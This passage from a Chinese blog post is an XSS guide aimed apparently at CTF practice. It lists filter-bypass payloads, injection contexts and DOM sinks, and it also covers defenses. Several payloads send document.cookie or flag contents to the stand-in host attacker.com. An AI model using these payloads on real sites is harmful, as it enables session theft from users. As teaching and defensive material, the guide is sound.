class="line">&lt;script&gt;$(&#x27;div.layui-table-cell.laytable-cell-1-0-1&#x27;).each(function (index, value) &#123;</span><br><span class="line">    if ((value.innerHTML.indexOf(&#x27;ctfshow&#123;&#x27;) &gt; -1)&amp;&amp;(value.innerHTML.indexOf(&#x27;script&#x27;) === -1)) &#123;</span><br><span class="line">        window.location.href = &#x27;http://attacker.com:9033/&#x27; +value.innerHTML;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="3-绕过技巧"><a href="#3-绕过技巧" class="headerlink" title="3. 绕过技巧"></a>3. 绕过技巧</h3><h4 id="3-1-标签名绕过"><a href="#3-1-标签名绕过" class="headerlink" title="3.1 标签名绕过"></a>3.1 标签名绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-&gt; 大小写混淆 --&gt;</span><br><span class="line">&lt;iMg onerror=alert(1) src=a&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 插入 NULL 字节 --&gt;</span><br><span class="line">&lt;%00img onerror=alert(1) src=a&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 空格替代字符 --&gt;</span><br><span class="line">&lt;img%09onerror=alert(1) src=a&gt;  &lt;!-&gt; Tab --&gt;</span><br><span class="line">&lt;img%0aonerror=alert(1) src=a&gt;  &lt;!-&gt; 换行 --&gt;</span><br><span class="line">&lt;img/&quot;onerror=alert(1) src=a&gt;   &lt;!-&gt; 异常语法 --&gt;</span><br></pre></td></tr></table></figure>

<h4 id="3-2-属性名绕过"><a href="#3-2-属性名绕过" class="headerlink" title="3.2 属性名绕过"></a>3.2 属性名绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img o%00nerror=alert(1) src=a&gt;</span><br><span class="line">&lt;imgonerror=&#x27;alert(1)&#x27;src=a&gt;</span><br></pre></td></tr></table></figure>

<h4 id="3-3-属性值编码绕过"><a href="#3-3-属性值编码绕过" class="headerlink" title="3.3 属性值编码绕过"></a>3.3 属性值编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;imgonerror=a%00lert(1) src=a&gt;</span><br><span class="line">&lt;imgonerror=a&amp;#x006c;ert(1) src=a&gt;</span><br></pre></td></tr></table></figure>

<h4 id="3-4-可编码属性"><a href="#3-4-可编码属性" class="headerlink" title="3.4 可编码属性"></a>3.4 可编码属性</h4><h5 id="URL-类型属性（支持-javascript-协议）"><a href="#URL-类型属性（支持-javascript-协议）" class="headerlink" title="URL 类型属性（支持 javascript: 协议）"></a>URL 类型属性（支持 <code>javascript:</code> 协议）</h5><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">href=`</span><br><span class="line">`action=`</span><br><span class="line">`formaction=`</span><br><span class="line">`location=</span><br></pre></td></tr></table></figure></blockquote>
<h5 id="资源加载类属性（支持-base64-或外链）"><a href="#资源加载类属性（支持-base64-或外链）" class="headerlink" title="资源加载类属性（支持 base64 或外链）"></a>资源加载类属性（支持 base64 或外链）</h5><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">src=`</span><br><span class="line">`data=`</span><br><span class="line">`poster=`</span><br><span class="line">`background=`</span><br><span class="line">`code=</span><br></pre></td></tr></table></figure></blockquote>
<h5 id="脚本执行类属性"><a href="#脚本执行类属性" class="headerlink" title="脚本执行类属性"></a>脚本执行类属性</h5><blockquote>
<p><code>on*=</code> 所有以 <code>on</code> 开头的事件处理属性</p>
</blockquote>
<h4 id="3-5-字符集与长度限制绕过"><a href="#3-5-字符集与长度限制绕过" class="headerlink" title="3.5 字符集与长度限制绕过"></a>3.5 字符集与长度限制绕过</h4><h5 id="使用非标准编码"><a href="#使用非标准编码" class="headerlink" title="使用非标准编码"></a>使用非标准编码</h5><blockquote>
<p>UTF-7<br>US-ASCII<br>UTF-16</p>
</blockquote>
<h5 id="拆分跨站脚本（用于绕过长度限制）"><a href="#拆分跨站脚本（用于绕过长度限制）" class="headerlink" title="拆分跨站脚本（用于绕过长度限制）"></a>拆分跨站脚本（用于绕过长度限制）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  z=&#x27;&lt;script src=&#x27;;</span><br><span class="line">  z+=&#x27;test.c&#x27;;</span><br><span class="line">  z+=&#x27;n/1.js&gt;&lt;\/script&gt;&#x27;;</span><br><span class="line">  document.write(z);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>执行结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=test.cn/1.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h5 id="JavaScript-层面的绕过技巧"><a href="#JavaScript-层面的绕过技巧" class="headerlink" title="JavaScript 层面的绕过技巧"></a>JavaScript 层面的绕过技巧</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-&gt; Unicode 编码关键字 --&gt;</span><br><span class="line">&lt;script&gt;a\u006cert(1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(&#x27;a\u006cert(1)&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 替代点操作符 --&gt;</span><br><span class="line">&lt;script&gt;alert(document[&#x27;cookie&#x27;])&lt;/script&gt;</span><br><span class="line">&lt;script&gt;with(document)alert(cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="4-XSS-可插入位置"><a href="#4-XSS-可插入位置" class="headerlink" title="4. XSS 可插入位置"></a>4. XSS 可插入位置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-&gt; 用户输入作为 script 标签内容 --&gt;</span><br><span class="line">&lt;script&gt;用户输入&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 用户输入作为 HTML 注释 --&gt;</span><br><span class="line">&lt;!-&gt; 用户输入 --&gt;</span><br><span class="line">&lt;!-&gt; --&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;!-&gt; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 用户输入作为标签属性名 --&gt;</span><br><span class="line">&lt;div 用户输入=&quot;xx&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div &gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;xx&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 用户输入作为标签属性值 --&gt;</span><br><span class="line">&lt;div id=&quot;用户输入&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;&quot;&gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;x&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 用户输入作为标签名 --&gt;</span><br><span class="line">&lt;用户输入 id=&quot;xx&quot; /&gt;</span><br><span class="line">&lt;&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;b id=&quot;xx&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 用户输入作为 CSS 内容 --&gt;</span><br><span class="line">&lt;style&gt;用户输入&lt;/style&gt;</span><br><span class="line">&lt;style&gt;&lt;/style&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;style&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h3 id="5-漏洞挖掘"><a href="#5-漏洞挖掘" class="headerlink" title="5. 漏洞挖掘"></a>5. 漏洞挖掘</h3><h4 id="5-1-黑盒测试"><a href="#5-1-黑盒测试" class="headerlink" title="5.1 黑盒测试"></a>5.1 黑盒测试</h4><blockquote>
<p>URL 参数<br>表单输入<br>搜索框<br>评论系统<br>个人信息页面</p>
</blockquote>
<h4 id="5-2-白盒测试"><a href="#5-2-白盒测试" class="headerlink" title="5.2 白盒测试"></a>5.2 白盒测试</h4><blockquote>
<p>检查输入处理函数<br>检查输出编码<br>检查 DOM 操作<br>检查 JavaScript 事件处理</p>
</blockquote>
<h4 id="5-3-常见业务场景"><a href="#5-3-常见业务场景" class="headerlink" title="5.3 常见业务场景"></a>5.3 常见业务场景</h4><blockquote>
<p>重灾区：评论区、留言区、个人信息、订单信息等<br>针对型：站内信、网页即时通讯、私信、意见反馈<br>存在风险：搜索框、当前目录、图片属性等</p>
</blockquote>
<h4 id="5-4-漏洞查找方法"><a href="#5-4-漏洞查找方法" class="headerlink" title="5.4 漏洞查找方法"></a>5.4 漏洞查找方法</h4><h5 id="基本验证¶"><a href="#基本验证¶" class="headerlink" title="基本验证¶"></a>基本验证<a target="_blank" rel="noopener" href="https://wilesangh.github.io/ctf-web/xss_guide/#_6">¶</a></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;</span><br><span class="line">&quot;%3e%3cscript%3ealert(document.cookie)%3c/script%3e</span><br><span class="line">&quot;&gt;&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;/script&gt;ipt&gt;</span><br><span class="line">%00&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h5 id="DOM-型-XSS-查找"><a href="#DOM-型-XSS-查找" class="headerlink" title="DOM 型 XSS 查找"></a>DOM 型 XSS 查找</h5><p>检查以下危险的 DOM 属性和 API：</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">document.location`</span><br><span class="line">`document.URL`</span><br><span class="line">`document.URLUnencoded`</span><br><span class="line">`document.referrer`</span><br><span class="line">`window.location</span><br></pre></td></tr></table></figure></blockquote>
<p>检查以下危险的 JavaScript 操作：</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">document.write()` / `document.writeln()`</span><br><span class="line">`document.body.innerHTML`</span><br><span class="line">`eval()`</span><br><span class="line">`window.execScript()`</span><br><span class="line">`window.setInterval()` / `window.setTimeout()</span><br></pre></td></tr></table></figure></blockquote>
<h3 id="6-防御措施"><a href="#6-防御措施" class="headerlink" title="6. 防御措施"></a>6. 防御措施</h3><h4 id="6-1-输入验证"><a href="#6-1-输入验证" class="headerlink" title="6.1 输入验证"></a>6.1 输入验证</h4><blockquote>
<p>长度限制<br>字符白名单<br>正则表达式过滤</p>
</blockquote>
<h4 id="6-2-输出编码"><a href="#6-2-输出编码" class="headerlink" title="6.2 输出编码"></a>6.2 输出编码</h4><blockquote>
<p>HTML 实体编码<br>JavaScript 编码<br>URL 编码</p>
</blockquote>
<h4 id="6-3-安全响应头"><a href="#6-3-安全响应头" class="headerlink" title="6.3 安全响应头"></a>6.3 安全响应头</h4><blockquote>
<p>Content-Security-Policy<br>X-XSS-Protection<br>X-Content-Type-Options</p>
</blockquote>
<h4 id="6-4-其他措施"><a href="#6-4-其他措施" class="headerlink" title="6.4 其他措施"></a>6.4 其他措施</h4><blockquote>
<p>使用 HttpOnly Cookie<br>实施 CSRF 令牌<br>使用安全的框架和库</p>
</blockquote>
<h4 id="6-5-DOM-型防御"><a href="#6-5-DOM-型防御" class="headerlink" title="6.5 DOM 型防御"></a>6.5 DOM 型防御</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 输入验证</span><br><span class="line">var a = document.URL;</span><br><span class="line">a = a.substring(a.indexOf(&quot;message=&quot;) + 8);</span><br><span class="line">a = unescape(a);</span><br><span class="line">var regex = /^([A-Za-z0-9\s]+)$/;</span><br><span class="line">if (regex.test(a)) &#123;</span><br><span class="line">    document.write(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 输出编码</span><br><span class="line">function reinit(str) &#123;</span><br><span class="line">    var d = document.createElement(&#x27;div&#x27;);</span><br><span class="line">    d.appendChild(document.createTextNode(str));</span><br><span class="line">    return d.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="7-实战案例"><a href="#7-实战案例" class="headerlink" title="7. 实战案例"></a>7. 实战案例</h3><h4 id="7-1-反射型-XSS-利用"><a href="#7-1-反射型-XSS-利用" class="headerlink" title="7.1 反射型 XSS 利用"></a>7.1 反射型 XSS 利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location.href=&#x27;https://attacker.com/steal?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="7-2-存储型-XSS-利用"><a href="#7-2-存储型-XSS-利用" class="headerlink" title="7.2 存储型 XSS 利用"></a>7.2 存储型 XSS 利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=location.href=&quot;https://attacker.com/steal?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure>

<h4 id="7-3-DOM-型-XSS-利用"><a href="#7-3-DOM-型-XSS-利用" class="headerlink" title="7.3 DOM 型 XSS 利用"></a>7.3 DOM 型 XSS 利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$(&#x27;div.layui-table-cell&#x27;).each(function(index,value)&#123;</span><br><span class="line">    if(value.innerHTML.indexOf(&#x27;flag&#123;&#x27;)&gt;-1)&#123;</span><br><span class="line">        window.location.href=&#x27;http://attacker.com/&#x27;+value.innerHTML;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">JGwebre</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://heisha123.github.io/2025/07/14/XSS-%E5%85%A8/">https://heisha123.github.io/2025/07/14/XSS-全/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本站点所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://heisha123.github.io">JG的个人博客</a>！</span></div></div><div class="post-copyright valine" id="comments-container"><script src="//unpkg.com/valine@1.4.14/dist/Valine.min.js"></script><script>let arr = location.href.split('/#more')[0].split('/');
let title = arr[arr.length - 1];
if (title === '') {
    title = arr[arr.length - 2];
}
var flag = false;
var gitFun = function () {
    try {
        var valineObj = window.GLOBAL_CONFIG.valine;
        new Valine({
            el: "#comments-container",
            ...valineObj
        });
        flag = true;
    } catch (e) {
        flag = false;
    }
}
var setIn = setInterval(() => {
    if (!flag) {
        gitFun();
    } else {
        clearInterval(setIn);
    }
}, 200);</script></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/"><i class="fas fa-angle-left">&nbsp;</i><span>XSS-DOM破坏</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2025/07/13/%E5%AE%9E%E6%88%98-%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9B%B2%E7%9B%92/"><span>实战-关于微信小程序盲盒</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2025 By JGwebre</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>